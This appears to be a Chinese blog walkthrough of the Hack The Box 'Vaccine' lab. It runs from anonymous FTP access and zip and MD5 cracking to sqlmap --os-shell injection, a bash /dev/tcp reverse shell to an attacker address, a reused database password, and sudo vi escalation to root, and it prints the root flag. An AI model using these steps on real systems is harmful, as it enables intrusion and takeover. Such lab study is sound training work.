---
title: HTB-Vaccine
description: 'Hack the box'
pubDate: 2024-03-02 
image: /hackthebox/Vaccine.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Linux Machine
---

## TASK 1
![](/image/hackthebox/Vaccine-1.png)

nmap扫一下

![](/image/hackthebox/Vaccine-2.png)

FTP服务托管

## TASK 2
![](/image/hackthebox/Vaccine-3.png)

anonymous 匿名用户

## TASK 3
![](/image/hackthebox/Vaccine-4.png)

![](/image/hackthebox/Vaccine-5.png)

登录上去ls一下即可看到文件

## TASK 4
![](/image/hackthebox/Vaccine-6.png)

<font style="color:rgb(25, 27, 31);">bin或者binary</font>

<font style="color:rgb(25, 27, 31);">设置文件传输类型为二进制传输类型。一般默认为ascii传输类型，但是使用ascii模式传输类似于可执行文件时，会造成传输的文件内容不对。因此建议在上传或者下载文件之前，执行 </font><font style="color:rgb(25, 27, 31);background-color:rgb(248, 248, 250);">bin</font><font style="color:rgb(25, 27, 31);"> 命令将文件传输类型设置为二进制传输类型。</font>

<font style="color:rgb(25, 27, 31);">get 文件名即可</font>

![](/image/hackthebox/Vaccine-7.png)

发现压缩包内含有密码

使用john进行爆破

<font style="color:rgb(77, 77, 77);">压缩包中存在index.php，使用弱密码尝试解压压缩包，发现行不通，那就需要用到爆破工具来爆破密码了</font>  
<font style="color:rgb(77, 77, 77);">这时候会用到john的zip2john脚本，将加密压缩包的密码hash值导出到文件中，再用john对其进行爆破</font>

![](/image/hackthebox/Vaccine-8.png)

## TASK 5
下载的压缩包里存在着文件，点击即可发现password

觉得像md5加密直接丢md5解密

![](/image/hackthebox/Vaccine-9.png)

## TASK 6
![](/image/hackthebox/Vaccine-10.png)

![](/image/hackthebox/Vaccine-11.png)

### –os-shell原理
使用udf提权获取webshell，也是通过into outfile向服务器写入两个文件，一个是可以直接执行系统命令，一个是进行上传文件。

### –os-shell的执行条件：
dbms为mysql，网站必须是root权限

攻击者需要知道网站的绝对路径

magic_quotes_gpc = off，php主动转移功能关闭

## TASK 7
![](/image/hackthebox/Vaccine-12.png)

sqlmap -u [http://10.129.92.36/dashboard.php?search=1](http://10.129.92.36/dashboard.php?search=1) --cookie=PHPSESSID=s1c9n2bp4skgni8aeb889s6tjk --os-shell

先利用sqlmap 登录进去取得cookie防止被重定向到登录界面之后反弹shell

得到shell后

先查下id

![](/image/hackthebox/Vaccine-13.png)

<font style="color:rgb(25, 27, 31);">发现命令行不太对劲</font>

<font style="color:rgb(25, 27, 31);">进行反弹下shell</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/bin/bash -c 'bash -i >& /dev/tcp/</font><font style="color:rgb(13, 13, 13);">10.10.16.20</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/4444 0>&1'</font>

![](/image/hackthebox/Vaccine-14.png)

成功反弹shell

<font style="color:rgb(25, 27, 31);">find / -group </font>**<font style="color:rgb(255, 255, 255);background-color:rgb(20, 29, 43);">postgres </font>**<font style="color:rgb(25, 27, 31);"> 2>/dev/null</font>

<font style="color:rgb(25, 27, 31);">发现大量可执行文件</font>

<font style="color:rgb(77, 77, 77);">使用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sudo -l</font><font style="color:rgb(77, 77, 77);">查看我们有哪些命令可以sudo使用</font>

![](/image/hackthebox/Vaccine-15.png)

<font style="color:rgb(77, 77, 77);">在nmap的扫描结果中知道靶机用的是apache服务，那就可以去</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/var/www/html</font><font style="color:rgb(77, 77, 77);">目录看下，发现有个dashboard.php</font>

> <font style="color:rgb(77, 77, 77);"> $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");</font>
>

<font style="color:rgb(77, 77, 77);">发现密码，直接ssh连接即可</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ssh postgres@10.129.92.36</font>

![](/image/hackthebox/Vaccine-16.png)

发现可以运行vi

## TASK 8
![](/image/hackthebox/Vaccine-17.png)

![](/image/hackthebox/Vaccine-18.png)

## TASK 9
![](/image/hackthebox/Vaccine-19.png)

由于<font style="color:rgb(77, 77, 77);">发现我们可以sudo使用vi编辑/etc/postgresql/11/main/pg_hba.conf文件，那么就可以用sudo vi提权</font>

<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">进入vi界面后可能会界面重叠，直接输入</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">:!/bin/bash</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">再点击回车即可，输入</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">whoami</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现已经成功提权为root</font>

> <font style="color:rgb(13, 13, 13);">在Vi编辑器中，</font>**<font style="color:rgb(13, 13, 13);">!</font>**<font style="color:rgb(13, 13, 13);">是用来执行shell命令的一个命令行操作符。当你在Vi编辑器中按下</font>**<font style="color:rgb(13, 13, 13);">!</font>**<font style="color:rgb(13, 13, 13);">后，它会让你在编辑器中执行一个外部的shell命令，并显示输出结果。例如，你提到的</font>**<font style="color:rgb(13, 13, 13);">!/bin/bash</font>**<font style="color:rgb(13, 13, 13);">将会执行</font>**<font style="color:rgb(13, 13, 13);">/bin/bash</font>**<font style="color:rgb(13, 13, 13);">这个shell，并进入到一个交互式的bash环境中。</font>
>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">dd6e058e814260bc70e9bbdef2715849</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">{感觉这个靶机相较于前面靶机简单好多好多}</font>



